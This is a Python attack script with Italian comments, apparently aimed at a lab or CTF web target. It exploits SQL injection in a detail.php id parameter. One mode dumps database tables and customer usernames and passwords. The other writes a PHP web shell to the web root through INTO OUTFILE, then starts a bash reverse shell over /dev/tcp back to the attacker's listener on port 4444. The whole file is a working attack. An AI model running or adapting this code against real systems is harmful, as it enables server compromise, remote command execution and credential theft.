import sys
import requests
from pwn import *
from bs4 import BeautifulSoup as BS

ip_attaccante = "172.17.0.1"
ip_vittima, option, url = "", "", ""

def print_response_query(response):
    soup = BS(response.text, "html.parser")
    tag_nome = soup.find(string=lambda t : t and "Name:" in t)

    if tag_nome:
        risultato = tag_nome.strip().split("Name: ")[1]
        print(risultato)

def enum_db():

    # Facciamo vedere le tabella
    # Facciamo vedere il numero di colonne della tabella costumers
    # Facciamo vedere il contenuto della tabella customers
    # Facciamo vedere il numero di colonne della tabella costumers
    # Facciamo vedere il contenuto della tabella customers

    queries = [
        "999'+UNION+SELECT+1,group_concat(table_name),3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()%23",
        "999'+UNION+SELECT+1,group_concat(column_name),3,4,5+FROM+information_schema.columns+WHERE+table_name='customers'%23",
        "999'+UNION+SELECT+1,group_concat(username,0x3a,password),3,4,5+FROM+customers%23",
        "999'+UNION+SELECT+1,group_concat(column_name),3,4,5+FROM+information_schema.columns+WHERE+table_name='products'%23",
        "999'+UNION+SELECT+1,group_concat(name,0x3a,priv),3,4,5+FROM+products%23"
    ]

    for query in queries:
        response = requests.get(url+query)
        print_response_query(response)

def run_shell():
    PORT = 4444

    l = listen(PORT)

    payload = "<?php system($_GET['cmd']); ?>"
    payload = payload.encode('utf-8').hex()
    requests.get(url + f"999'+UNION+SELECT+1,0x{payload},3,4,5+INTO+OUTFILE+%27/var/www/html/shell.php%27%23") # %27 è '

    try:
        requests.get(f"http://{ip_vittima}/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/{ip_attaccante}/4444%200%3E%261%22", timeout=0.1)
    except requests.exceptions.ReadTimeout:
        pass

    c = l.wait_for_connection()
    c.interactive()


if len(sys.argv) == 3:
    ip_vittima = sys.argv[1]
    option = sys.argv[2]
else:
    print("Inserire ip della vittima e modalità come parametri:")
    print("$ python3 sql_injection_detail2.py <IP_VITTIMA> <d|s>")
    exit(-1)

url = f"http://{ip_vittima}/detail.php?id="

if option == "d":
    enum_db()
elif option == "s":
    run_shell()
else:
    print("Opzione non valida. Usare 'd' per enumerazione o 's' per shell.")



